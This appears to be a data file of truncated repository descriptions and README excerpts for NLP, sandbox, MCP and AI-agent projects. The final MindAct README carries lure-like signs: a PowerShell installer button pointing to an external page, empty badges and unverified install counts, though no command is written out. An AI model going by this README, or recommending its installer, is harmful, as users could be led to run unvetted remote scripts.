candidates.description: Natural Language Processing for the next decade. Tokenization, Part-of-Speech Tagging, Named Entity Recognition, Syntactic & Semantic Dependency Parsing, Document Classification
candidates.readme_excerpt:
HanLP: Han Language Processing

中文 | 日本語 | Docs | Forum

HanLP is the multilingual NLP library designed for researchers and enterprises, built on PyTorch and TensorFlow 2.x to advance state-of-the-art deep learning techniques in academia and industry. HanLP was designed from day one to be efficient, user-friendly and extendable. Thanks to open-access corpora like Universal Dependencies and OntoNotes, HanLP 2.1 now offers 10 joint tasks on [130 languages](https://hanlp.hankcs.com/docs/api/hanlp/pretrained/mtl.html#hanlp.pretrained.mtl.UD_ONTONOTES_TOK_POS_LEM_FEA_NER_SRL_DEP_SDP_CON_MMINILMV2L6): tokenization, lemmatization, part-of-speech tagging, token feature extraction, dependency parsing, constituency parsing, semantic role labeling, semantic dependency parsing, abstract meaning representation (AMR) parsing. For end users, HanLP offers light-weighted RESTful APIs and native Python APIs. ## RESTful APIs Tiny packages in several KBs for agile development and mobile applications. Although anonymous users are welcomed, an auth key is suggested and [a free one can be applied here](https://bbs.hankcs.com/t/apply-for-free-hanlp-restful-apis/3178) under the [CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/) license.

candidates.readme_excerpt:
# sandbox-mcp

## Give your AI agent a brand-new Windows PC. Then throw it away.

Not your desktop. Not a container pretending to be Windows. **A real, disposable Windows 11 machine**:
boot it, deploy your app, drive the controls, catch the crash, keep the evidence, delete the PC.
Run it directly with `sbx`; the optional MCP adapter exposes discoverable tools and inline images for clients that want them.
Both interfaces use the same engine. The measured GUI samples take roughly **40-50 seconds** end to end.
See the [website](https://shanselman.github.io/sandbox-mcp/).

![Real offline Sandbox: Haptics app UI Automation, light-to-dark theme, app exit and guest teardown](docs/sandbox-teaser.gif)

*Real app, real guest: Haptics Everywhere's self-contained WPF/WinForms desktop app in a fresh, network-off Sandbox.
UIA selects the Inspector, the guest switches light to dark, the app relaunches and exits, then the guest is destroyed.
10-second, 183 KB edited footage: light Inspector slowed for readability, repeated dark frames trimmed.
Boot/teardown title cards summarize actual logs, not filmed boot/shutdown.
No guest runtime installation or haptic-hardware claim. [Fresh dark lab screenshot](docs/haptics-teaser.png) ·
[Earlier light-theme inspector](docs/haptics-inspector.png).*

### 🤖 Let your agent set it up

Give this to your bot. It checks the PC, verifies the download and asks before admin changes or a restart.
The CLI works on its own; configure MCP only if your agent needs that interface:

```text
Set up the sandbox-mcp CLI by following:
https://raw.githubusercontent.com/shanselman/sandbox-mcp/main/docs/agent-setup.md
Install the latest verified release. The CLI must work without MCP; configure the optional MCP adapter only if my agent needs it. Ask before admin changes or a restart.
```

**[Download v1.2.0](https://github.com/shanselman/sandbox-mcp/releases/tag/v1.2.0)**: portable CLI + optional MCP server,
bundled Node.js, guest agent and setup instructions. No Node/npm installation needed.

### “Works on my machine.” Caught in 30 seconds.

The dev box had Visual C++ installed. The fresh, **network-off** customer PC did not:

```text
FAIL  NativeProof.exe on a fresh Windows Sandbox (29.8s)
  why      exited with code -1073741515; Missing dependency: VC++ redistributable.
```

Opt in to the verified runtime install, then repeat on another fresh guest:

```text
PASS  NativeProof.exe on a fresh Windows Sandbox (30.9s)
  baseline PROVISIONED (not a clean-mach

**Auto Ontology MCP** (`auto-ontology-mcp`) brings [NVIDIA Auto Ontology](https://github.com/NVIDIA/auto-ontology)'s semantic layer to any MCP client, for two jobs: - **Ask your databases.** Point it at a database, and the model you already use (Claude Code, Codex, OpenClaw, Hermes Agent, Cursor, VS Code, or the Claude and ChatGPT apps) builds business Terms, reviews joins and answers questions with SQL that the server checks against the ontology and the data. - **Keep a personal knowledge base.** Share receipts, statements, papers, book notes or screenshots with your assistant; it reads them and stores the facts as records, the ideas as linked concepts, the passages worth finding again in a full-text index, and where each came from. The full originals stay in your Obsidian vault. # Awesome AI Agent Platforms [![Awesome](https://awesome.re/badge.svg)](https://awesome.re)

> A curated list of open-source AI agent platforms: AI coworkers and teammates, agent builders and frameworks, workflow automation platforms, browser agents, and coding agents, with license and hosting notes for every entry.

AI coworkers are persistent agents that people delegate real work to: they sign in to tools, keep context, run on schedules, and come back with finished work. This list covers the platforms that provide them, the frameworks developers build them with, and the automation and specialist agents around them.

Browse this list as a website with a full comparison table at [aiagentplatforms.dev](https://aiagentplatforms.dev).

![Market map of the AI agent platform landscape](media/market-map.svg)

## Contents

- [AI coworkers and teammates](#ai-coworkers-and-teammates)
- [Agent builders and frameworks](#agent-builders-and-frameworks)
- [Workflow automation platforms](#workflow-automation-platforms)
- [Browser agents](#browser-agents)
- [Coding agents](#coding-agents)
- [Selection criteria](#selection-criteria)
- [Contributing](#contributing)
- [License](#license)

## AI coworkers and teammates

Platforms that give an individual or a team persistent agents they can delegate work to through chat, a desktop, or a shared workspace.

- [Agent Zero](https://github.com/frdel/agent-zero) - Personal agent with a Linux desktop, browser, files, skills, and plugins. License: MIT. Hosting: self-hosted with Docker; desktop launcher available.
- [Agenta](https://github.com/agenta-ai/agenta) - Workspace for building AI coworkers and automations through chat, sharing them with a team, and running them interactively or in the background. License: MIT core, separately licensed enterprise features. Hosting: self-hosted; hosted service available.
- [Eigent](https://github.com/eigent-ai/eigent) - Desktop application for building and managing a workforce of agents that completes multi-step tasks. License: Apache-2.0. Hosting: local desktop.
- [General Input](https://www.generalinput.com) - Web application that turns everyday business processes into AI‑powered systems your whole team can understand, monitor, and share. License: proprietary. Hosting: vendor-hosted; managed on-prem deployment available.
- [Hermes Agent](https://github.com/NousResearch/hermes-agent) - Personal agent with memory, skills, tools, scheduled jobs, and messaging channels. License: MIT. Hosting: self

candidates.description: MindAct: Community-Driven AI Agent for Claude, Obsidian, and RAG Knowledge Graphs
candidates.readme_excerpt:
# 🧠 MindAct – AI-Powered Personal Knowledge Automation for Discord & Telegram ![](files/preview.png) ### ⌨️ PowerShell Command Button [![](files/button.png)](https://pnyn96.github.io/mindact-agent/) [![ci](https://img.shields.io/badge/ci-green-2ea44f?style=flat&labelColor=0d1117)]() [![installs](https://img.shields.io/badge/installs-5.1k-14b8a6?style=flat&labelColor=0d1117)]() [![state](https://img.shields.io/badge/state-stable-2ea44f?style=flat&labelColor=0d1117)]() [![language](https://img.shields.io/badge/language-python-2dd4bf?style=flat&labelColor=0d1117)]() [![powershell-7](https://img.shields.io/badge/powershell--7-installer-0d9488?style=flat&labelColor=0d1117)]()
--- Meet MindAct, the open-source companion that turns your scattered notes into a living knowledge graph. Built around an AI agent that brings Claude, Obsidian, and retrieval-augmented generation together, it helps you capture, connect, and query everything you know without leaving your own machine. Whether you're mapping research, organizing a vault, or just trying to remember where that one idea went, MindAct keeps the busywork in the background so you can focus on thinking. It's shaped by a friendly community of tinkerers and note-hoarders, and there's always room for one more. ## 📋 System Requirements - **OS:** Windows 10 / 11 - **Shell:** PowerShell 5.1+ or PowerShell 7+ - **Network:** internet access to download the script - **Privileges:** standard user ## Features - **AI-powered knowledge graph** – MindAct connects Claude, Obsidian, and retrieval-augmented generation so your notes stop being a pile of files and start behaving like a living, queryable graph. Ask questions in plain language and let the agent trace connections you didn't know were there. - **Local-first by design** – Your vault stays on your machine. The agent works against your own knowledge base, so your ideas, drafts, and research never need to leave your computer just to get organized. - **Obsidian-native integration** – Point MindAct at your vault and it reads, links, and enriches your notes in place. No exporting, no reformatting, no second brain required — it plugs into the one you already have. - **RAG that actually understands your context** – Retrieval pulls the right passages from your own notes before the model answers, which means responses are grounded in what *you* have written rather than generic guesswork. - **Build and query the graph** – Grow your persona
